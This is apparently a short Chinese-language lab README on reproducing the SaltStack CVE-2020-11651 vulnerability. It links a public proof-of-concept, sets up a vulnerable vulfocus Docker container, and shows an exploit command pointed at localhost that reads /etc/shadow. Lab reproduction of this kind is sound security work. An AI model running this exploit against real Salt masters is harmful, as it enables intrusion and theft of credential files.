#复现步骤

## 脚本可使用https://github.com/jasperla/CVE-2020-11651-poc
## 安装salt 
Pip3 install salt 

如果安装网络过慢，可以换源

pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple

## 拉取环境镜像

docker pull vulfocus/saltstack-cve_2020_11651

## 运行镜像

docker run -p 4506:4506 vulfocus/saltstack-cve_2020_11651
等待一会
## 利用脚本复现

python3 exploit.py --master 127.0.0.1 -r /etc/shadow
![image](https://github.com/guobaoyou/vul_environment/blob/master/SaltStack_RCE/1.png)
详见脚本